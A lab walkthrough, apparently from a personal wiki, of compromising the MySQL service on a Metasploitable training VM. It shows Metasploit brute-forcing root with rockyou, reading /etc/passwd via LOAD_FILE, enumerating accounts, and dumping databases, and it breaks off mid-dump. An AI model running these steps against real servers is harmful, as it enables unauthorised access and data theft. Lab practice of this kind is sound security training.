
Metasploitable/MySQL
Contents [hide]

    1 Basics
    2 MySQL
        2.1 Exploiting MySQL
        2.2 Obtain /etc/passwd from MySQL with Metasploit
        2.3 MySQL Enumerate Users
        2.4 Dump MySQL Database Contents (SQL Commands)
        2.5 Dump MySQL Database Contents (mysqlshow)
        2.6 Dump MySQL Database Contents (mysqldump)
            2.6.1 Damn Vulnerable Web App
            2.6.2 Owasp10 Database
    3 Flags

Basics

See MSF for context of how we are using the Metasploit framework.

See Metasploitable for walkthrough of different parts of Metasploitable virtual box.
MySQL

We've just done some recon of the Metasploitable box, which is at 10.0.0.27. We saw it had multiple services running, including MySQL.

Let's focus on the MySQL service:

3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 53
|   Version: .0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ConnectWithDatabase, LongColumnFlag, SupportsCompression
|   Status: Autocommit
|_  Salt: w$K,8vk7k8tagd@PR*zK

This is a very old version of MySQL (5.0.5, the current version is 5.7.11). If we look for mysql exploits in metasploit, we find this one: https://www.offensive-security.com/metasploit-unleashed/scanner-mysql-auxiliary-modules/

This is a brute-force login exploit for MySQL.

msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

Note that in order to successfully use this, we'll need some wordlists for username and password combinations.

We can illustrate the process using some of the wordlists included with Kali, in /usr/share/wordlists.

We'll use the rockyou list:

$ cd /usr/share/wordlists
$ gunzip rockyou.txt.gz
$ ls -lh rockyou.txt

Now that we have rockyou.txt as our wordlist, let's use it as the password file with metasploit.

Here, we set various options for this particular exploit.

We set threads to 1000, to make it brute force.

We set RHOSTS to the IP address of the metasploitable virtualbox (10.0.0.27).

Set the password file to be the rockyou password list.

Set the username to "root" - if you're going to brute-force a password, it should probably be the one that can do everything.

And make sure and try blank passwords - because you never know.


msf auxiliary(mysql_login) > set THREADS 1000
THREADS => 1000
msf auxiliary(mysql_login) > set RHOSTS 10.0.0.27
RHOST => 10.0.0.27
msf auxiliary(mysql_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf auxiliary(mysql_login) > set USERNAME root
USERNAME => root
msf auxiliary(mysql_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(mysql_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(mysql_login) > set BLANK_PASSWORDS true
BLANK_PASSWORDS => true

Now run the exploit:

msf auxiliary(mysql_login) > run


msf auxiliary(mysql_login) > run

[*] 10.0.0.27:3306 MYSQL - Found remote MySQL version 5.0.51a
[+] 10.0.0.27:3306 MYSQL - Success: 'root:'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mysql_login) >

Looks like the root user on the database does not have a password. A bit of a lame challenge, but I'll take it!
Exploiting MySQL

Once you have credentials to connect to the MySQL server, you will want to pivot from recon mode to attack mode. This means you'll be using different exploits from metasploit. Whereas the initial exploit was a scanner, the subsequent exploits will be admin exploits.

There are two different ways to exploit the MySQL server to obtain system information and database information. These are covered below.
Obtain /etc/passwd from MySQL with Metasploit

The mysql_sql exploit can be used to connect to the remote database and scan the contents of the /etc/passwd file to get a list of users on the system.

This is done by executing SQL's load_file() function.

We'll be using an auxiliary/admin/ exploit in metasploit. This one is auxiliary/admin/mysql/mysql_sql:

msf auxiliary(mysql_login) > use auxiliary/admin/mysql/mysql_sql
msf auxiliary(mysql_sql) >

This one has fewer options:

msf auxiliary(mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOST                       yes       The target address
   RPORT     3306              yes       The target port
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as

We'll use the root username and a blank password (as we found in the prior step). The Metasploitable virtualbox uses port 3306 for the sql server, so we'll leave rport alone. We will set RHOST to the IP address of the Metasploitable virtualbox. Finally, the SQL that we will execute is:

SELECT LOAD_FILE('/etc/passwd')

This can be set with MSF console like so:

msf auxiliary(mysql_sql) > set USERNAME root
USERNAME => root
msf auxiliary(mysql_sql) > set PASSWORD ''
PASSWORD =>
msf auxiliary(mysql_sql) > set RHOST 10.0.0.27
RHOST => 10.0.0.27
msf auxiliary(mysql_sql) > set RPORT 3306
RPORT => 3306
msf auxiliary(mysql_sql) > set SQL select load_file(\'/etc/passwd\')
SQL => select load_file('/etc/passwd')

Now execute:

msf auxiliary(mysql_sql) > run

[*] Sending statement: 'select load_file('/etc/passwd')'...
[*]  | root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
 |
[*] Auxiliary module execution completed
msf auxiliary(mysql_sql) >

MySQL Enumerate Users

This is the other mysql admin exploit. This one will enumerate (list) all of the MySQL accounts on the system and their various privileges.

Using it is as easy as pie. You set the username and password variables to root and blank password, then set the port and remote host ip address. Then you're good to go.

msf auxiliary(mysql_sql) > use auxiliary/admin/mysql/mysql_enum
msf auxiliary(mysql_enum) > show options

Module options (auxiliary/admin/mysql/mysql_enum):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOST                      yes       The target address
   RPORT     3306             yes       The target port
   USERNAME                   no        The username to authenticate as

msf auxiliary(mysql_enum) > set PASSWORD ''
PASSWORD =>
msf auxiliary(mysql_enum) > set USERNAME root
USERNAME => root
msf auxiliary(mysql_enum) > set RPORT 3306
RPORT => 3306
msf auxiliary(mysql_enum) > set RHOST 10.0.0.27
RHOST => 10.0.0.27

Now run the exploit and check out the info:

msf auxiliary(mysql_enum) > run

[*] Running MySQL Enumerator...
[*] Enumerating Parameters
[*] 	MySQL Version: 5.0.51a-3ubuntu5
[*] 	Compiled for the following OS: debian-linux-gnu
[*] 	Architecture: i486
[*] 	Server Hostname: metasploitable
[*] 	Data Directory: /var/lib/mysql/
[*] 	Logging of queries and logins: OFF
[*] 	Old Password Hashing Algorithm OFF
[*] 	Loading of local files: ON
[*] 	Logins with old Pre-4.1 Passwords: OFF
[*] 	Allow Use of symlinks for Database Files: YES
[*] 	Allow Table Merge: YES
[*] 	SSL Connections: Enabled
[*] 	SSL CA Certificate: /etc/mysql/cacert.pem
[*] 	SSL Key: /etc/mysql/server-key.pem
[*] 	SSL Certificate: /etc/mysql/server-cert.pem
[*] Enumerating Accounts:
[*] 	List of Accounts with Password Hashes:
[*] 		User: debian-sys-maint Host:  Password Hash:
[*] 		User: root Host: % Password Hash:
[*] 		User: guest Host: % Password Hash:
[*] 	The following users have GRANT Privilege:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following users have CREATE USER Privilege:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following users have RELOAD Privilege:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following users have SHUTDOWN Privilege:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following users have SUPER Privilege:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following users have FILE Privilege:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following users have PROCESS Privilege:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following accounts have privileges to the mysql database:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following accounts have empty passwords:
[*] 		User: debian-sys-maint Host:
[*] 		User: root Host: %
[*] 		User: guest Host: %
[*] 	The following accounts are not restricted by source:
[*] 		User: guest Host: %
[*] 		User: root Host: %
[*] Auxiliary module execution completed

Since we already have access to the root user in MySQL, there's no need to brute force other login names. However, if there were many users in a complex database, this might yield a treasure trove of usernames with different privileges, allowing you to see different sections of the database.


Dump MySQL Database Contents (SQL Commands)

Use the SHOW DATABASES sql command to show the databases available.

Use the USE tablename sql command to use a particular database.

Once you've selected a particular database, you can start to explore it. From the list of databases, we can deduce the following:

    computer is running two tikiwiki instances
    dvwa = damn vulnerable web application

Remember, the password is blank - just hit enter when prompted for password.

$ mysql -u root -p -h 10.0.0.27
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10654
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set (0.00 sec)


Once you have seen all of the databases, you can pick one and start to print out information about it to see what you can see:


mysql> USE information_schema;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> SHOW TABLES;
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| KEY_COLUMN_USAGE                      |
| PROFILING                             |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+
17 rows in set (0.00 sec)

mysql> USE dvwa; SHOW TABLES;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
2 rows in set (0.00 sec)

mysql> USE metasploit; SHOW TABLES;
Database changed
Empty set (0.00 sec)

mysql> USE mysql; SHOW TABLES;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| func                      |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| proc                      |
| procs_priv                |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
17 rows in set (0.00 sec)

mysql> USE owasp10; SHOW TABLES;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+-------------------+
| Tables_in_owasp10 |
+-------------------+
| accounts          |
| blogs_table       |
| captured_data     |
| credit_cards      |
| hitlog            |
| pen_test_tools    |
+-------------------+
6 rows in set (0.01 sec)

mysql> USE tikiwiki; SHOW TABLES;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

^[[ADatabase changed
+------------------------------------+
| Tables_in_tikiwiki                 |
+------------------------------------+
| galaxia_activities                 |
| galaxia_activity_roles             |
| galaxia_instance_activities        |
| galaxia_instance_comments          |
| galaxia_instances                  |
| galaxia_processes                  |
| galaxia_roles                      |
| galaxia_transitions                |
| galaxia_user_roles                 |
| galaxia_workitems                  |
| messu_archive                      |
| messu_messages                     |
| messu_sent                         |
| sessions                           |
| tiki_actionlog                     |
| tiki_article_types                 |
| tiki_articles                      |
| tiki_banners                       |
| tiki_banning                       |
| tiki_banning_sections              |
| tiki_blog_activity                 |
| tiki_blog_posts                    |
| tiki_blog_posts_images             |
| tiki_blogs                         |
| tiki_calendar_categories           |
| tiki_calendar_items                |
| tiki_calendar_locations            |
| tiki_calendar_roles                |
| tiki_calendars                     |
| tiki_categories                    |
| tiki_categorized_objects           |
| tiki_category_objects              |
| tiki_category_sites                |
| tiki_chart_items                   |
| tiki_charts                        |
| tiki_charts_rankings               |
| tiki_charts_votes                  |
| tiki_chat_channels                 |
| tiki_chat_messages                 |
| tiki_chat_users                    |
| tiki_comments                      |
| tiki_content                       |
| tiki_content_templates             |
| tiki_content_templates_sections    |
| tiki_cookies                       |
| tiki_copyrights                    |
| tiki_directory_categories          |
| tiki_directory_search              |
| tiki_directory_sites               |
| tiki_download                      |
| tiki_drawings                      |
| tiki_dsn                           |
| tiki_dynamic_variables             |
| tiki_eph                           |
| tiki_extwiki                       |
| tiki_faq_questions                 |
| tiki_faqs                          |
| tiki_featured_links                |
| tiki_file_galleries                |
| tiki_file_handlers                 |
| tiki_files                         |
| tiki_forum_attachments             |
| tiki_forum_reads                   |
| tiki_forums                        |
| tiki_forums_queue                  |
| tiki_forums_reported               |
| tiki_friends                       |
| tiki_friendship_requests           |
| tiki_galleries                     |
| tiki_galleries_scales              |
| tiki_games                         |
| tiki_group_inclusion               |
| tiki_history                       |
| tiki_hotwords                      |
| tiki_html_pages                    |
| tiki_html_pages_dynamic_zones      |
| tiki_images                        |
| tiki_images_data                   |
| tiki_integrator_reps               |
| tiki_integrator_rules              |
| tiki_language                      |
| tiki_languages                     |
| tiki_link_cache                    |
| tiki_links                         |
| tiki_live_support_events           |
| tiki_live_support_message_comments |
| tiki_live_support_messages         |
| tiki_live_support_modules          |
| tiki_live_support_operators        |
| tiki_live_support_requests         |
| tiki_logs                          |
| tiki_mail_events                   |
| tiki_mailin_accounts               |
| tiki_menu_languages                |
| tiki_menu_options                  |
| tiki_menus                         |
| tiki_minical_events                |
| tiki_minical_topics                |
| tiki_modules                       |
| tiki_newsletter_groups             |
| tiki_newsletter_subscriptions      |
| tiki_newsletters                   |
| tiki_newsreader_marks              |
| tiki_newsreader_servers            |
| tiki_object_ratings                |
| tiki_page_footnotes                |
| tiki_pages                         |
| tiki_pageviews                     |
| tiki_poll_objects                  |
| tiki_poll_options                  |
| tiki_polls                         |
| tiki_preferences                   |
| tiki_private_messages              |
| tiki_programmed_content            |
| tiki_quicktags                     |
| tiki_quiz_question_options         |
| tiki_quiz_questions                |
| tiki_quiz_results                  |
| tiki_quiz_stats                    |
| tiki_quiz_stats_sum                |
| tiki_quizzes                       |
| tiki_received_articles             |
| tiki_received_pages                |
| tiki_referer_stats                 |
| tiki_related_categories            |
| tiki_rss_feeds                     |
| tiki_rss_modules                   |
| tiki_score                         |
| tiki_search_stats                  |
| tiki_searchindex                   |
| tiki_searchsyllable                |
| tiki_searchwords                   |
| tiki_secdb                         |
| tiki_semaphores                    |
| tiki_sent_newsletters              |
| tiki_sessions                      |
| tiki_sheet_layout                  |
| tiki_sheet_values                  |
| tiki_sheets                        |
| tiki_shoutbox                      |
| tiki_shoutbox_words                |
| tiki_stats                         |
| tiki_structure_versions            |
| tiki_structures                    |
| tiki_submissions                   |
| tiki_suggested_faq_questions       |
| tiki_survey_question_options       |
| tiki_survey_questions              |
| tiki_surveys                       |
| tiki_tags                          |
| tiki_theme_control_categs          |
| tiki_theme_control_objects         |
| tiki_theme_control_sections        |
| tiki_topics                        |
| tiki_tracker_fields                |
| tiki_tracker_item_attachments      |
| tiki_tracker_item_comments         |
| tiki_tracker_item_fields           |
| tiki_tracker_items                 |
| tiki_tracker_options               |
| tiki_trackers                      |
| tiki_translated_objects            |
| tiki_untranslated                  |
| tiki_user_answers                  |
| tiki_user_answers_uploads          |
| tiki_user_assigned_modules         |
| tiki_user_bookmarks_folders        |
| tiki_user_bookmarks_urls           |
| tiki_user_mail_accounts            |
| tiki_user_menus                    |
| tiki_user_modules                  |
| tiki_user_notes                    |
| tiki_user_postings                 |
| tiki_user_preferences              |
| tiki_user_quizzes                  |
| tiki_user_taken_quizzes            |
| tiki_user_tasks                    |
| tiki_user_tasks_history            |
| tiki_user_votings                  |
| tiki_user_watches                  |
| tiki_userfiles                     |
| tiki_userpoints                    |
| tiki_users                         |
| tiki_users_score                   |
| tiki_webmail_contacts              |
| tiki_webmail_messages              |
| tiki_wiki_attachments              |
| tiki_zones                         |
| users_grouppermissions             |
| users_groups                       |
| users_objectpermissions            |
| users_permissions                  |
| users_usergroups                   |
| users_users                        |
+------------------------------------+
194 rows in set (0.00 sec)

mysql> USE tikiwiki195; SHOW TABLES;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+------------------------------------+
| Tables_in_tikiwiki195              |
+------------------------------------+
| galaxia_activities                 |
| galaxia_activity_roles             |
| galaxia_instance_activities        |
| galaxia_instance_comments          |
| galaxia_instances                  |
| galaxia_processes                  |
| galaxia_roles                      |
| galaxia_transitions                |
| galaxia_user_roles                 |
| galaxia_workitems                  |
| messu_archive                      |
| messu_messages                     |
| messu_sent                         |
| sessions                           |
| tiki_actionlog                     |
| tiki_article_types                 |
| tiki_articles                      |
| tiki_banners                       |
| tiki_banning                       |
| tiki_banning_sections              |
| tiki_blog_activity                 |
| tiki_blog_posts                    |
| tiki_blog_posts_images             |
| tiki_blogs                         |
| tiki_calendar_categories           |
| tiki_calendar_items                |
| tiki_calendar_locations            |
| tiki_calendar_roles                |
| tiki_calendars                     |
| tiki_categories                    |
| tiki_categorized_objects           |
| tiki_category_objects              |
| tiki_category_sites                |
| tiki_chart_items                   |
| tiki_charts                        |
| tiki_charts_rankings               |
| tiki_charts_votes                  |
| tiki_chat_channels                 |
| tiki_chat_messages                 |
| tiki_chat_users                    |
| tiki_comments                      |
| tiki_content                       |
| tiki_content_templates             |
| tiki_content_templates_sections    |
| tiki_cookies                       |
| tiki_copyrights                    |
| tiki_directory_categories          |
| tiki_directory_search              |
| tiki_directory_sites               |
| tiki_download                      |
| tiki_drawings                      |
| tiki_dsn                           |
| tiki_dynamic_variables             |
| tiki_eph                           |
| tiki_extwiki                       |
| tiki_faq_questions                 |
| tiki_faqs                          |
| tiki_featured_links                |
| tiki_file_galleries                |
| tiki_file_handlers                 |
| tiki_files                         |
| tiki_forum_attachments             |
| tiki_forum_reads                   |
| tiki_forums                        |
| tiki_forums_queue                  |
| tiki_forums_reported               |
| tiki_friends                       |
| tiki_friendship_requests           |
| tiki_galleries                     |
| tiki_galleries_scales              |
| tiki_games                         |
| tiki_group_inclusion               |
| tiki_history                       |
| tiki_hotwords                      |
| tiki_html_pages                    |
| tiki_html_pages_dynamic_zones      |
| tiki_images                        |
| tiki_images_data                   |
| tiki_integrator_reps               |
| tiki_integrator_rules              |
| tiki_language                      |
| tiki_languages                     |
| tiki_link_cache                    |
| tiki_links                         |
| tiki_live_support_events           |
| tiki_live_support_message_comments |
| tiki_live_support_messages         |
| tiki_live_support_modules          |
| tiki_live_support_operators        |
| tiki_live_support_requests         |
| tiki_logs                          |
| tiki_mail_events                   |
| tiki_mailin_accounts               |
| tiki_menu_languages                |
| tiki_menu_options                  |
| tiki_menus                         |
| tiki_minical_events                |
| tiki_minical_topics                |
| tiki_modules                       |
| tiki_newsletter_groups             |
| tiki_newsletter_subscriptions      |
| tiki_newsletters                   |
| tiki_newsreader_marks              |
| tiki_newsreader_servers            |
| tiki_object_ratings                |
| tiki_page_footnotes                |
| tiki_pages                         |
| tiki_pageviews                     |
| tiki_poll_objects                  |
| tiki_poll_options                  |
| tiki_polls                         |
| tiki_preferences                   |
| tiki_private_messages              |
| tiki_programmed_content            |
| tiki_quicktags                     |
| tiki_quiz_question_options         |
| tiki_quiz_questions                |
| tiki_quiz_results                  |
| tiki_quiz_stats                    |
| tiki_quiz_stats_sum                |
| tiki_quizzes                       |
| tiki_received_articles             |
| tiki_received_pages                |
| tiki_referer_stats                 |
| tiki_related_categories            |
| tiki_rss_feeds                     |
| tiki_rss_modules                   |
| tiki_score                         |
| tiki_search_stats                  |
| tiki_searchindex                   |
| tiki_searchsyllable                |
| tiki_searchwords                   |
| tiki_secdb                         |
| tiki_semaphores                    |
| tiki_sent_newsletters              |
| tiki_sessions                      |
| tiki_sheet_layout                  |
| tiki_sheet_values                  |
| tiki_sheets                        |
| tiki_shoutbox                      |
| tiki_shoutbox_words                |
| tiki_stats                         |
| tiki_structure_versions            |
| tiki_structures                    |
| tiki_submissions                   |
| tiki_suggested_faq_questions       |
| tiki_survey_question_options       |
| tiki_survey_questions              |
| tiki_surveys                       |
| tiki_tags                          |
| tiki_theme_control_categs          |
| tiki_theme_control_objects         |
| tiki_theme_control_sections        |
| tiki_topics                        |
| tiki_tracker_fields                |
| tiki_tracker_item_attachments      |
| tiki_tracker_item_comments         |
| tiki_tracker_item_fields           |
| tiki_tracker_items                 |
| tiki_tracker_options               |
| tiki_trackers                      |
| tiki_translated_objects            |
| tiki_untranslated                  |
| tiki_user_answers                  |
| tiki_user_answers_uploads          |
| tiki_user_assigned_modules         |
| tiki_user_bookmarks_folders        |
| tiki_user_bookmarks_urls           |
| tiki_user_mail_accounts            |
| tiki_user_menus                    |
| tiki_user_modules                  |
| tiki_user_notes                    |
| tiki_user_postings                 |
| tiki_user_preferences              |
| tiki_user_quizzes                  |
| tiki_user_taken_quizzes            |
| tiki_user_tasks                    |
| tiki_user_tasks_history            |
| tiki_user_votings                  |
| tiki_user_watches                  |
| tiki_userfiles                     |
| tiki_userpoints                    |
| tiki_users                         |
| tiki_users_score                   |
| tiki_webmail_contacts              |
| tiki_webmail_messages              |
| tiki_wiki_attachments              |
| tiki_zones                         |
| users_grouppermissions             |
| users_groups                       |
| users_objectpermissions            |
| users_permissions                  |
| users_usergroups                   |
| users_users                        |
+------------------------------------+
194 rows in set (0.00 sec)

mysql>



Let's start with the juicy-looking owasp10 database.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set (0.01 sec)

mysql> use owasp10;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_owasp10 |
+-------------------+
| accounts          |
| blogs_table       |
| captured_data     |
| credit_cards      |
| hitlog            |
| pen_test_tools    |
+-------------------+
6 rows in set (0.00 sec)

We can use the describe command to describe the fields in each SQL table, as well as data types.

mysql> describe accounts;
+-------------+------------+------+-----+---------+----------------+
| Field       | Type       | Null | Key | Default | Extra          |
+-------------+------------+------+-----+---------+----------------+
| cid         | int(11)    | NO   | PRI | NULL    | auto_increment |
| username    | text       | YES  |     | NULL    |                |
| password    | text       | YES  |     | NULL    |                |
| mysignature | text       | YES  |     | NULL    |                |
| is_admin    | varchar(5) | YES  |     | NULL    |                |
+-------------+------------+------+-----+---------+----------------+
5 rows in set (0.02 sec)

mysql> describe credit_cards;
+------------+---------+------+-----+---------+----------------+
| Field      | Type    | Null | Key | Default | Extra          |
+------------+---------+------+-----+---------+----------------+
| ccid       | int(11) | NO   | PRI | NULL    | auto_increment |
| ccnumber   | text    | YES  |     | NULL    |                |
| ccv        | text    | YES  |     | NULL    |                |
| expiration | date    | YES  |     | NULL    |                |
+------------+---------+------+-----+---------+----------------+
4 rows in set (0.01 sec)

mysql>

Dump MySQL Database Contents (mysqlshow)

You can also use mysqlshow to more easily show the contents of the database. Use the host option to use a remote database.

root@morpheus:~/box/metasploitable# mysqlshow --host=10.0.0.27
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+

root@morpheus:~/box/metasploitable# mysqlshow --host=10.0.0.27 dvwa
Database: dvwa
+-----------+
|  Tables   |
+-----------+
| guestbook |
| users     |
+-----------+
root@morpheus:~/box/metasploitable# mysqlshow --host=10.0.0.27 --count dvwa
Database: dvwa
+-----------+----------+------------+
|  Tables   | Columns  | Total Rows |
+-----------+----------+------------+
| guestbook |        3 |          1 |
| users     |        6 |          5 |
+-----------+----------+------------+
2 rows in set.

Dump MySQL Database Contents (mysqldump)

See MySQL page for usage of mysqldump and a few other examples.

Like the mysqlshow command, the mysqldump command accepts the host argument. To dump a table, run the command like this:

# mysqldump --host=10.0.0.27 [tablename]

This will result in an SQL script that will recreate the entire database from scratch. (Make sure you use mysqlshow --count to make sure you aren't going to dump out a 500 GB database.
Damn Vulnerable Web App

Dumping the dvwa web app reveals some usernames and password hashes.

root@morpheus:~/box/metasploitable# mysqldump --host=10.0.0.27 dvwa > dvwa.sql

root@morpheus:~/box/metasploitable# cat dvwa.sql
-- MySQL dump 10.13  Distrib 5.5.47, for debian-linux-gnu (x86_64)
--
-- Host: 10.0.0.27    Database: dvwa
-- ------------------------------------------------------
-- Server version	5.0.51a-3ubuntu5

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Not dumping tablespaces as no INFORMATION_SCHEMA.FILES table on this server
--

--
-- Table structure for table `guestbook`
--

DROP TABLE IF EXISTS `guestbook`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `guestbook` (
  `comment_id` smallint(5) unsigned NOT NULL auto_increment,
  `comment` varchar(300) default NULL,
  `name` varchar(100) default NULL,
  PRIMARY KEY  (`comment_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `guestbook`
--

LOCK TABLES `guestbook` WRITE;
/*!40000 ALTER TABLE `guestbook` DISABLE KEYS */;
INSERT INTO `guestbook` VALUES (1,'This is a test comment.','test');
/*!40000 ALTER TABLE `guestbook` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `user_id` int(6) NOT NULL default '0',
  `first_name` varchar(15) default NULL,
  `last_name` varchar(15) default NULL,
  `user` varchar(15) default NULL,
